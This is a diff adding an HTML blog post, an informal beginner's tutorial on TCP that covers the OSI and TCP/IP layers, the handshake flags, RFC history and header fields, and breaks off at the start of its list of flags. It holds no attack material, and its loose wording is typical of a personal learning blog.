@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta itemprop="name"            content="Zwerd.com">
+  <meta itemprop="description"     content="A stunning blog of freaking PT warrior; you will find here cool stuff about networks, security and massive attacks!">
+  <meta itemprop="image"           content="https://zwerd.com/favicon.gif">
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      TCP connection &middot; Guy Zwerdling
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./favicon.gif" />
+<link rel="shortcut icon" href="./favicon.ico" />
+
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <div class="sidebar-mugshot">
+      <img src="/assets/images/logo.gif" alt="Guy Zwerdling">
+  </div>
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Guy Zwerdling
+      </a>
+    </div>
+    <p class="lead">A stunning blog of freaking PT warrior</p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+      <a class="page-link "
+          href="/Applications.html">Applications</a>
+    
+  
+
+  
+    
+      <a class="page-link "
+          href="/CV.html">CV</a>
+    
+  
+
+  
+    
+      <a class="page-link "
+          href="/about.html">About</a>
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+
+  <!-- Optional additional links to insert in sidebar nav -->
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+    <a id="github-link"
+       class="icon" title="Github Project" aria-label="Github Project"
+       href="https://github.com/zwerd">
+      <?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;" xml:space="preserve" class=""><g><g>
+	<g>
+		<path d="M158.173,352.599c-3.049,0.568-4.381,1.999-3.999,4.281c0.38,2.283,2.093,3.046,5.138,2.283    c3.049-0.76,4.38-2.095,3.997-3.997C162.931,353.074,161.218,352.216,158.173,352.599z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M141.898,354.885c-3.046,0-4.568,1.041-4.568,3.139c0,2.474,1.619,3.518,4.853,3.138c3.046,0,4.57-1.047,4.57-3.138    C146.753,355.553,145.134,354.502,141.898,354.885z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M119.629,354.022c-0.76,2.095,0.478,3.519,3.711,4.284c2.855,1.137,4.664,0.568,5.424-1.714    c0.572-2.091-0.666-3.61-3.711-4.568C122.197,351.265,120.39,351.922,119.629,354.022z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M414.41,24.123C398.326,8.042,378.964,0,356.309,0H82.225C59.577,0,40.208,8.042,24.123,24.123    C8.042,40.207,0,59.576,0,82.225v274.088c0,22.65,8.042,42.017,24.123,58.098c16.084,16.084,35.454,24.126,58.102,24.126h63.953    c4.184,0,7.327-0.144,9.42-0.424c2.092-0.288,4.184-1.526,6.279-3.717c2.096-2.187,3.14-5.376,3.14-9.562    c0-0.568-0.05-7.046-0.144-19.417c-0.097-12.375-0.144-22.176-0.144-29.41l-6.567,1.143c-4.187,0.76-9.469,1.095-15.846,0.999    c-6.374-0.096-12.99-0.76-19.841-1.998c-6.855-1.239-13.229-4.093-19.13-8.562c-5.898-4.477-10.085-10.328-12.56-17.559    l-2.856-6.571c-1.903-4.373-4.899-9.229-8.992-14.554c-4.093-5.332-8.232-8.949-12.419-10.852l-1.999-1.428    c-1.331-0.951-2.568-2.098-3.711-3.429c-1.141-1.335-1.997-2.669-2.568-3.997c-0.571-1.335-0.097-2.43,1.427-3.289    c1.524-0.855,4.281-1.279,8.28-1.279l5.708,0.855c3.808,0.76,8.516,3.042,14.134,6.851c5.614,3.806,10.229,8.754,13.846,14.843    c4.38,7.806,9.657,13.75,15.846,17.843c6.184,4.097,12.419,6.143,18.699,6.143s11.704-0.476,16.274-1.424    c4.565-0.954,8.848-2.385,12.847-4.288c1.713-12.751,6.377-22.559,13.988-29.41c-10.848-1.143-20.602-2.854-29.265-5.14    c-8.658-2.286-17.605-5.995-26.835-11.136c-9.234-5.14-16.894-11.512-22.985-19.13c-6.09-7.618-11.088-17.61-14.987-29.978    c-3.901-12.375-5.852-26.652-5.852-42.829c0-23.029,7.521-42.637,22.557-58.814c-7.044-17.32-6.379-36.732,1.997-58.242    c5.52-1.714,13.706-0.428,24.554,3.855c10.85,4.286,18.794,7.951,23.84,10.992c5.046,3.042,9.089,5.614,12.135,7.71    c17.705-4.949,35.976-7.423,54.818-7.423c18.841,0,37.115,2.474,54.821,7.423l10.849-6.852c7.426-4.57,16.18-8.757,26.269-12.562    c10.088-3.806,17.795-4.854,23.127-3.14c8.562,21.51,9.328,40.922,2.279,58.241c15.036,16.179,22.559,35.786,22.559,58.815    c0,16.18-1.951,30.505-5.852,42.969c-3.898,12.467-8.939,22.463-15.13,29.981c-6.184,7.519-13.894,13.843-23.124,18.986    c-9.232,5.137-18.178,8.853-26.84,11.132c-8.661,2.286-18.414,4.004-29.263,5.147c9.891,8.562,14.839,22.072,14.839,40.538v68.238    c0,3.237,0.472,5.852,1.424,7.851c0.958,1.998,2.478,3.374,4.571,4.141c2.102,0.76,3.949,1.235,5.571,1.424    c1.622,0.191,3.949,0.287,6.995,0.287h63.953c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102    V82.225C438.533,59.576,430.491,40.204,414.41,24.123z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M86.793,319.195c-1.331,0.948-1.141,2.471,0.572,4.565c1.906,1.902,3.427,2.189,4.57,0.855    c1.331-0.948,1.141-2.471-0.575-4.569C89.458,318.336,87.936,318.049,86.793,319.195z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M77.374,312.057c-0.57,1.335,0.096,2.478,1.999,3.426c1.521,0.955,2.762,0.767,3.711-0.568    c0.57-1.335-0.096-2.478-1.999-3.433C79.182,310.91,77.945,311.102,77.374,312.057z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M95.646,330.331c-1.715,0.948-1.715,2.666,0,5.137c1.713,2.478,3.328,3.142,4.853,1.998c1.714-1.334,1.714-3.142,0-5.427    C98.978,329.571,97.359,328.993,95.646,330.331z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		<path d="M105.641,343.174c-1.714,1.526-1.336,3.327,1.142,5.428c2.281,2.279,4.185,2.566,5.708,0.849    c1.524-1.519,1.143-3.326-1.142-5.42C109.068,341.751,107.164,341.463,105.641,343.174z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+	</g>
+</g></g> </svg>
+
+    </a>
+    <a id="twitter"
+       class="icon" title="twitter" aria-label="Guy twitter"
+       href="https://twitter.com/guyzwerdling">
+      <?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" viewBox="0 0 486.392 486.392" style="enable-background:new 0 0 486.392 486.392;" xml:space="preserve" width="512px" height="512px" class=""><g><g>
+	<g>
+		<g>
+			<path d="M395.193,0H91.198C40.826,0,0,40.826,0,91.198v303.995c0,50.372,40.826,91.198,91.198,91.198     h303.995c50.372,0,91.198-40.827,91.198-91.198V91.198C486.392,40.826,445.565,0,395.193,0z M364.186,188.598l0.182,7.752     c0,79.16-60.221,170.359-170.359,170.359c-33.804,0-65.268-9.91-91.776-26.904c4.682,0.547,9.454,0.851,14.288,0.851     c28.059,0,53.868-9.576,74.357-25.627c-26.204-0.486-48.305-17.814-55.935-41.586c3.678,0.669,7.387,1.034,11.278,1.034     c5.472,0,10.761-0.699,15.777-2.067c-27.39-5.533-48.031-29.7-48.031-58.701v-0.76c8.086,4.499,17.297,7.174,27.116,7.509     c-16.051-10.731-26.63-29.062-26.63-49.825c0-10.974,2.949-21.249,8.086-30.095c29.518,36.236,73.658,60.069,123.422,62.562     c-1.034-4.378-1.55-8.968-1.55-13.649c0-33.044,26.812-59.857,59.887-59.857c17.206,0,32.771,7.265,43.714,18.908     c13.619-2.706,26.448-7.691,38.03-14.531c-4.469,13.984-13.953,25.718-26.326,33.135c12.069-1.429,23.651-4.682,34.382-9.424     C386.073,169.659,375.889,180.208,364.186,188.598z" data-original="#010002" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+		</g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+	<g>
+	</g>
+</g></g> </svg>
+
+    </a>
+    <a id="linkedin"
+       class="icon" title="linkedin" aria-label="Guy linkedin"
+       href="https://www.linkedin.com/in/guy-zwerdling/">
+      <?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;" xml:space="preserve"><g><g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123   C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126   h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225   C438.532,59.576,430.49,40.204,414.41,24.123z M133.618,367.157H67.666V169.016h65.952V367.157z M127.626,132.332   c-6.851,6.567-15.893,9.851-27.124,9.851h-0.288c-10.848,0-19.648-3.284-26.407-9.851c-6.76-6.567-10.138-14.703-10.138-24.41   c0-9.897,3.476-18.083,10.421-24.556c6.95-6.471,15.942-9.708,26.98-9.708c11.039,0,19.89,3.237,26.553,9.708   c6.661,6.473,10.088,14.659,10.277,24.556C137.899,117.625,134.477,125.761,127.626,132.332z M370.873,367.157h-65.952v-105.92   c0-29.879-11.036-44.823-33.116-44.823c-8.374,0-15.42,2.331-21.128,6.995c-5.715,4.661-9.996,10.324-12.847,16.991   c-1.335,3.422-1.999,8.75-1.999,15.981v110.775h-65.952c0.571-119.529,0.571-185.579,0-198.142h65.952v27.974   c13.867-21.681,33.558-32.544,59.101-32.544c22.84,0,41.21,7.52,55.104,22.554c13.895,15.037,20.841,37.214,20.841,66.519v113.64   H370.873z" data-original="#000000" class="active-path" data-old_color="#ffffff" fill="#ffffff"/>
+</g></g> </svg>
+
+    </a>
+    <a id="github-download-link"
+       class="icon" title="Downloads" aria-label="Downloads"
+       href="/Downloads/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+    <a id="tags-link"
+       class="icon"
+       title="Tags" aria-label="Tags"
+       href="/tags.html">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+    </a>
+  
+
+  
+    <a id="search-link"
+       class="icon"
+       title="Search" aria-label="Search"
+       href="/search.html">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+
+  <p>
+  &copy; 2017.
+  <a href="/LICENSE.md">Zwerd Web Deisgn</a>
+</p>
+
+</div>
+
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">TCP connection</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">24 Nov 2017</span>
+  <span class="post-categories">
+    
+  </span>
+</div>
+
+  <div class="post-body">
+    <p>Ok, I write this post because of two things, the first reason is because I had in interview in some High Tech School and I ran for a teacher job position, the first interview was great, my passion for security and hacking stuff done more than I expected, for one second I thought that I will be a Cyber coacher, but the second interview was worse, In the second interview I was needed to speak about the TCP and UDP protocols, I have a great knowledge about those two, but to be sure I going on to read about theme little more, in the interview I was needed to pass a lesson to some students that doesn’t know nothing about networking nor security stuff, so I try to explain everything but I confused everything and the students found it difficult to understand the material, so I was not accepted to teach there. I remember when I first learn the TCP I have so much question but the teacher doesn’t really give me the all knowledge about TCP so I was needed to look over the Internet and with some Google search I found what I was needed, so these are the two reason why I was write the article, first I have knowledge of TCP and I feel like I need to improve it to myself after I failed in the interview, and second I want that if some one will read that article he will have very good understanding how TCP really work.</p>
+
+<p>The well none protocol named TCP is one of the important protocol that really matter in the wide network of today. This protocol as a big play part
+in the Internet in general, many protocols relay on TCP and many protocols designed in such way that without TCP they cannot run. The Important thin
+is that the TCP is can seams so complex but the truth is the opposite, all we need to do is actually look on the session of some protocol that relay on TCP and after we learn theoretically how TCP works it’s more easy to understand.</p>
+
+<p>In my opinion, to understand really good how TCP work we need to lean as follow:</p>
+<ol>
+  <li><a href="#tcp-in-the-osi-and-tcp-ip-module">TCP in the OSI and TCP-IP module.</a></li>
+  <li><a href="#basic-tcp-functionality-and-basic-flags-like-syn-ack-fin">Basic TCP Functionality and basic flags like SYN, ACK, FIN.</a></li>
+  <li><a href="#history-of-tcp-in-rfcs-793-3168-3540">History of TCP in RFC’s 793/3168/3540.</a></li>
+  <li><a href="#tcp-segment-structure">TCP segment structure.</a></li>
+  <li><a href="#tcp-session-in-real-world">TCP session in real world.</a></li>
+  <li><a href="#the-special-flags">The special flags.</a></li>
+  <li><a href="#tcp-attacks">TCP attacks.</a></li>
+</ol>
+
+<p>so let’s get started</p>
+
+<h3 id="tcp-in-the-osi-and-tcp-ip-module">TCP in the OSI and TCP-IP module</h3>
+
+<p>first of all TCP is in the Transport layer in the TCP/IP or IOS models. Brief refresh on OSI model, this is a seven layers model that are labeled from 1 through 7.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Layer No.</th>
+      <th>Layer Name</th>
+      <th style="text-align: center">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>7</td>
+      <td>Application</td>
+      <td style="text-align: center">Consists of standard communication services and applications that everyone can use.</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>Presentation</td>
+      <td style="text-align: center">Ensures that information is delivered to the receiving machine in a form that it can understand.</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>Session</td>
+      <td style="text-align: center">Manages the connections and terminations between cooperating computers.</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>Transport</td>
+      <td style="text-align: center">Manages the transfer of data and assures that received and transmitted data are identical.</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Network</td>
+      <td style="text-align: center">Manages data addressing and delivery between networks.</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Data Link</td>
+      <td style="text-align: center">Handles the transfer of data across the network media.</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>Physical</td>
+      <td style="text-align: center">Defines the characteristics of the network hardware.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Figure 1 OSI Model</p>
+
+<p>The transport layer is where the TCP live, Layer 4 of the OSI model is named the transport layer and is responsible for message segmentation, acknowledgement, traffic control, and session multiplexing. The transport layer also has the ability to perform error detection and correction (resends), message reordering to ensure message sequence, and reliable message channel depending on the specific transport layer protocol used. The most common of the used transport layer protocols include the Transport Control Protocol (TCP) and User Datagram Protocol (UDP).</p>
+
+<p>TCP is also on layer 3 of TCP/IP model, like the OSI model, the TCP/IP model is layered and is used in the same fashion as the OSI model but with fewer layers. As the modern Internet and most communications use the Internet Protocol (IP), the TCP/IP model is technically more in line with modern network implementations. As stated before, the layers within the TCP/IP model are considered less rigid then that of the OSI model, which basically means that many protocols implemented can be considered in grey areas between one area and another. The TCP/IP protocol suite (often referred to as the TCP/IP protocol) contains the same protocols referenced in the earlier OSI model sections. Figure
+2 below shows a representation of the TCP/IP model:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Layer No.</th>
+      <th>Layer Name</th>
+      <th style="text-align: center">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>4</td>
+      <td>Application</td>
+      <td style="text-align: center">Consists of standard communication services and applications that everyone can use.</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Transport</td>
+      <td style="text-align: center">Manages the transfer of data and assures that received and transmitted data are identical.</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Network</td>
+      <td style="text-align: center">Manages data addressing and delivery between networks.</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>Link</td>
+      <td style="text-align: center">Handles the transfer of data across the network media.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Figure 2 TCP/IP Model</p>
+
+<p><strong>Summary</strong></p>
+
+<p>TCP is paced in transport layer in the TCP/IP and OSI model, this layer is about reliability of the connection the message that sent on that layer are called segments, this layer also responsible for acknowledgement, traffic control, and session multiplexing. will will see as we proceed in the article how it actually look like in real communication between tow endpoints.</p>
+
+<h3 id="basic-tcp-functionality-and-basic-flags-like-syn-ack-fin">Basic TCP Functionality and basic flags like SYN ACK FIN</h3>
+
+<p>The functionality of the TCP working with two main important thing:</p>
+<ul>
+  <li>Approved every revived TCP segment, in that way the other side that get the approvement know that what he sent successfully arrived to the other side.</li>
+  <li>Numbering every segment with some sequence number before we sent it, in this way we can be shore that if the other side get the segments <strong>not in the same order</strong> as we sent it he will know what the order by that sequence number.</li>
+</ul>
+
+<p>those are the main thing that TCP responsible to do, there is many application out there that working with TCP because of this functionality, but the is some application that doesn’t and this can be because of millions reasons one of that is that the application itself for some reason do checking that the other side get the message.</p>
+
+<p>The is three which is the most important flags in every session that you will see in every TCP session is the SYN, ACK and FIN. The SYN flag is used every time some endpoint want to start session with other endpoint, you can consider that like the following example:</p>
+
+<p>some one named Assaf go’s down the sthreet and see his friend Asher, so he start a conversation:</p>
+
+<p>Assaf: Hello! how do you do?</p>
+
+<p>Asher: I’m good! and you?</p>
+
+<p>Assaf: Great!</p>
+
+<p><img src="/assets/images/tcp-session-page-001.jpg" alt="tcp-session" title="tcp-session" class="img-responsive" height="1000px" width="2000px" />
+Figure 3 real life conversation</p>
+
+<p>In TCP it pretty much the same, one site ask the other that he want to start conversation with him and the other response with sort of ok like and the first one do the same.</p>
+
+<p>endpoint1: I wanna to SYN with you!</p>
+
+<p>endpoint2: OK, I want to SYN with you too!</p>
+
+<p>endpoint1: OK.</p>
+
+<p><img src="/assets/images/SYN+ACK.png" alt="SYN+ACK" title="SYN+ACK" class="img-responsive" height="1000px" width="2000px" />
+Figure 4 TCP starting conversation</p>
+
+<p>In real session you will see that the most if not all segment message are sent with the flag ACK as active which means that we get what the other endpoint was sent and now we respond for it with new segment and approved the receivement with ACK flag.</p>
+
+<p>As you go foreword in this article you will see that every flag is actually a bit in the segment message that represent by <code class="highlighter-rouge">1</code> or <code class="highlighter-rouge">0</code>, if the flag is active than we will see that the bit is set to <code class="highlighter-rouge">1</code>.</p>
+
+<p>There is many flags out there but the other flag that we will see often is the FIN flag that stand for finish. If one side of opening conversation want to close the session, he is just send TCP segment message with activated FIN flag.</p>
+
+<p><img src="/assets/images/FIN+ACK.png" alt="FIN+ACK" title="FIN+ACK" class="img-responsive" height="1000px" width="2000px" />
+Figure 5 TCP ending conversation</p>
+
+<p>Till now is so simple; to open a session all we need to do is to send <strong>SYN</strong> flag to the other side, throughout the conversation we always approved the receivement of the TCP segment from the other side with activated <strong>ACK</strong>, when we wanna close running session we just sent TCP segment with activated <strong>FIN</strong> flag and that’s it.</p>
+
+<p><strong>Summary</strong></p>
+
+<p>So the functionality of TCP is always approved if we get the segment or not and numbering the TCP segment with sequence number.</p>
+
+<h3 id="history-of-tcp-in-rfcs-793-3168-3540">History of TCP in RFCs 793 3168 3540.</h3>
+
+<p>Before we start to get down to deep detail is better to know some history. The TCP was developed and designed in 1970s by two DARPA scientists - Vint Cerf and Bob Kahn, persons most often called the fathers of the Internet.</p>
+
+<p>Kahn worked on an existing project to establish a satellite packet network, and initiated a project to establish a ground-based radio packet network. These experiences convinced him of the need for development of an open-architecture network model, where any network could communicate with any other independent of individual hardware and software configuration. Kahn therefore set four goals for the design of what would become the <strong>Transmission Control Protocol</strong></p>
+
+<p>In the spring of 1973, Vinton Cerf joined Kahn on the project and together they wrote the RFC 675 and it was the first ever version of TCP and the real name of TCP was <strong>Transmission Control Program</strong>.</p>
+
+<p>In 1981 DARPA scientists write another RFC number 793 and this was actually the first RFC of the <strong>TRANSMISSION CONTROL PROTOCOL</strong>, in that RFC we can find a structure of the TCP/IP model and the TCP implementations.</p>
+
+<p>There is some more RFC that discuss the TCP and update the protocol, but I want to focus on only two RFCs 3168 and 3540. The original RFC 793 specified a six flags that we can activat in the TCP segment which is as follow:</p>
+<ul>
+  <li>URG</li>
+  <li>ACK</li>
+  <li>PSH</li>
+  <li>RST</li>
+  <li>SYN</li>
+  <li>FIN</li>
+</ul>
+
+<p><em>I will explain them all later on</em></p>
+
+<p>The RFCs 3168 and 3540 specifies together three bit flags named ECN which stand for Explicit Congestion Notification, the three flags are as follow:</p>
+<ul>
+  <li>ECN-none</li>
+  <li>CWR</li>
+  <li>ECE</li>
+</ul>
+
+<p><em>Please remember those, we will come back to them later on</em></p>
+
+<p><strong>Summary</strong></p>
+
+<p>The TCP at first was publish in RFC 793 and update later in RFC 3168 and RFC 3540, these are important because the bits that they specified, we will see as we go further in this article why we need these three bit flags, but for know I just want you to remember that there is six main flags and more three flags that responsible for congestion which is sort of collision that accrue in the network.</p>
+
+<h3 id="tcp-segment-structure">TCP segment structure.</h3>
+
+<p>Ok, now we going to discuss on the really cool things in TCP segment. The structure of the TCP header look like follow:</p>
+
+<p><img src="/assets/images/TCP.jpg" alt="TCP" title="TCP" class="img-responsive" height="1000px" width="2000px" />
+Figure 6 TCP header structure</p>
+
+<p>As you can see the length of the segment is 32 bit long, just please remember that the TCP segment is consists of bits so in reality it’s structure of <code class="highlighter-rouge">0</code> and <code class="highlighter-rouge">1</code> that represented the values of the filed in the TCP header.</p>
+
+<p>So let’s check out the headers:</p>
+
+<p><strong>Source ports</strong> - The port number is really important because with that port we use to represent some service. In source port the sender generate some random port between 49152 to 65535 and that port are used through all the session between the two devices that communicate.</p>
+
+<p><strong>Destination port</strong> - The destination port is actually some service that represented by some port, as example HTTP represented by port 80 and FTP represented by port 21, so, if we want to use some service of some server like HTTP, we communicate with that server by using port 80 in the destination, in that way the receiver which is the server know that we want the HTTP service which is used to display some HTML page that the server has.</p>
+
+<p><strong>Sequence number</strong> - Sequence number or short SEQ is used to tracked down the data that as being send, so if we sent some data we count the data in the sequence field plus previous sequence number, as example if we had in the previous sequence field 1476 and the amount of data we sending now is 658 byte, the new sequence will be 1476 + 658 which is 2134, this mean that the sequence number always go greater through the session. please remember the rule of the sequence number as follow:</p>
+<ul>
+  <li>The sequence number is the number of <strong>previously sent data</strong> plus the <strong>previously sent sequence number</strong> to the other endpoint.</li>
+</ul>
+
+<p><strong>Acknowledgement number</strong> - This field used to acknowledge the data that we receive, in that way we can know what data as being receive by the other side and what data doesn’t by the acknowledge number that the other side send us after he get some data from us, if he doesn’t get the data we will don’t received any acknowledge from him about that data so in this case we will send the data again until the other side will approve that he get the data. The counting of the acknowledgement goes by the following rule:</p>
+<ul>
+  <li>The acknowledgement number is the number of the <strong>received data</strong> plus the <strong>received sequence number</strong> we get from the other endpoint.</li>
+</ul>
+
+<p>I want to stop you here to clear the <strong>ACK</strong> and <strong>SEQ</strong> numbers in the session. later on I will demonstrate that principle again and again because I want that you will have a good understanding how the things really works.</p>
+
+<p>If you remember in the section of <strong>Basic TCP Functionality</strong> we saw some basic session like starting session in TCP and ending session, so, let’s look now in deep what is really going on.</p>
+
+<p>Let’s say that John want to communicate with bob in some sort of protocol that using TCP.</p>
+
+<ol>
+  <li>
+    <p>To start the session John need to send <strong>SYN</strong> flag first because he want to synchronize with Bob about some values that will be used through the conversation. in the SEQ and ACK headers the values will be 0’s because nothing of the rules that we saw earlier doesn’t apply yet, we have no received data and no received sequence number, and we haven’t sent any data and sequence number. because this is the first time we send message in TCP with flag SYN set, the message that send will be count with 1 phantom byte because of the SYN flag.</p>
+
+    <p><img src="/assets/images/firstSYN.png" alt="" /><strong>Figure 7</strong> first-SYN from John.</p>
+  </li>
+  <li>
+    <p>Bob received the TCP segment message, he sees that the message contain flag of SYN in active form so he knows that John want to start conversation with him. Bob respond with two flags: <strong>SYN</strong> and <strong>ACK</strong>, the SYN is because he want to synchronize with John about some values like John did, and the ACK is because he want to inform John that he get the message. In the ACK number header Bob set it to 1 because as you remember the received data is 1 which is the phantom byte and the received sequence number is 0 so it’s 1+0=1, so now when John will get this message he will new by the acknowledgement number that the previous message arrived successfully without data lost.</p>
+
+    <p><img src="/assets/images/firstSYN3.png" alt="SYN-and-ACK" title="SYN-and-ACK" class="img-responsive" height="3000px" />
+Figure 8 SYN and ACK from Bob with acknowledgement number calculation.</p>
+  </li>
+  <li>
+    <p>John received the message and sees that Bob what to synchronize with him too, he also see the ACK flag active so he know that Bob actually approved the receivement, because Bob activated SYN flag John count it as phantom byte and add it to the sequence number which is 0, so in the message that John going send to Bob filled with ACK value of 1, and now because John sent previously some message that contain sequence number of 0 and phantom byte of 1 (because of the SYN) John now respond to Bob with TCP segment that contain sequence number of 1. in the flag area John activate only the ACK flag to approved that the segment that came from Bob successfully arrived.</p>
+  </li>
+</ol>
+
+<p><img src="/assets/images/firstSYN4.png" alt="ACK" title="ACK-from-john" class="img-responsive" height="3000px" />
+Figure 9 ACK from John with sequence of 1 and acknowledge of 1.</p>
+
+<p>we will see more of that ack and seq calculation further on.</p>
+
+<p><strong>TCP header length</strong> - This header also called <strong>data offset</strong>, this field are specified the entire length of the TCP segment, this include the previous headers, the source and destination port number, the acknowledgement number, the sequence number and so on. As you can see in the diagram in figure 6 this field in 4 bit long.</p>
+
+<p><strong>Reserved</strong> - The reserved is actually the gray field in the diagram in figure 6, it is 6 bit long that <strong>reserved</strong> for future use. It’s actually just 3 bit and more 3 bit used for ECN as I specified earlier, but just keep in mind that there is 6 bit in that area and after that more 6 bit that used for flags.</p>
+
+<p><strong>Flags</strong> - The 6 bits after the reserved bits are used for flags, this flags is takes a big part in the tcp session. for each flag there is a scenario, to see each flag we going to use network analyzer like Wireshark, you can use TCPdump or NAST or any kind of analyzer you like, I’m using Wireshark for the examples. we going to see each flag but not in the same order as you saw in the TCP segment structure you’ll understand why later on.</p>
+
+<ul>
+  <li>
